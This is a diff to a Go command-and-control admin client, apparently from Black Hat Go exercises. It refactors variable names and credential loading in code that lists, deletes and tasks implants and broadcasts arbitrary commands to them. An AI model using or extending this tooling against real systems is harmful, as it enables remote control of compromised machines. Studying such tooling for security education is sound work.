@@ -1,6 +1,7 @@
 package main
 
 import (
+	"blackhatgo/c2c/client"
 	"blackhatgo/c2c/grpcapi"
 	"context"
 	"fmt"
@@ -16,13 +17,13 @@ import (
 
 func main() {
 	var (
-		opts   []grpc.DialOption
-		conn   *grpc.ClientConn
-		err    error
-		client grpcapi.AdminClient
+		opts        []grpc.DialOption
+		conn        *grpc.ClientConn
+		err         error
+		adminClient grpcapi.AdminClient
 	)
 
-	creds, err := loadTLSClientCreds()
+	creds, err := client.LoadTLSClientCreds()
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -32,7 +33,7 @@ func main() {
 		log.Fatal(err)
 	}
 	defer conn.Close()
-	client = grpcapi.NewAdminClient(conn)
+	adminClient = grpcapi.NewAdminClient(conn)
 	ctx := context.Background()
 
 	cmdFlags := &cli.Command{
@@ -42,7 +43,7 @@ func main() {
 				Usage: "List implants",
 				Action: func(ctx context.Context, c *cli.Command) error {
 					req := &grpcapi.Empty{}
-					implantsList, err := client.ListRegisteredImplants(ctx, req)
+					implantsList, err := adminClient.ListRegisteredImplants(ctx, req)
 					if err != nil {
 						return err
 					}
@@ -81,7 +82,7 @@ func main() {
 					deleteRequest := &grpcapi.DeleteRequest{
 						Id: id,
 					}
-					_, err := client.DeleteImplant(ctx, deleteRequest)
+					_, err := adminClient.DeleteImplant(ctx, deleteRequest)
 					if err != nil {
 						return err
 					}
@@ -117,7 +118,7 @@ func main() {
 					fmt.Printf("[*] Tasking %s to run: %s\n", targetID, instruction)
 
 					// 5. Call the gRPC server
-					res, err := client.RunCommand(ctx, req)
+					res, err := adminClient.RunCommand(ctx, req)
 					if err != nil {
 						return fmt.Errorf("command failed: %v", err)
 					}
@@ -137,7 +138,7 @@ func main() {
 						return fmt.Errorf("error: what command do you want to broadcast?")
 					}
 
-					list, err := client.ListRegisteredImplants(ctx, &grpcapi.Empty{})
+					list, err := adminClient.ListRegisteredImplants(ctx, &grpcapi.Empty{})
 					if err != nil {
 						return err
 					}
@@ -156,7 +157,7 @@ func main() {
 								In:        instruction,
 							}
 
-							res, err := client.RunCommand(ctx, req)
+							res, err := adminClient.RunCommand(ctx, req)
 							if err != nil {
 								fmt.Printf("[!] %s: Failed -> %v\n", implantID, err)
 								return
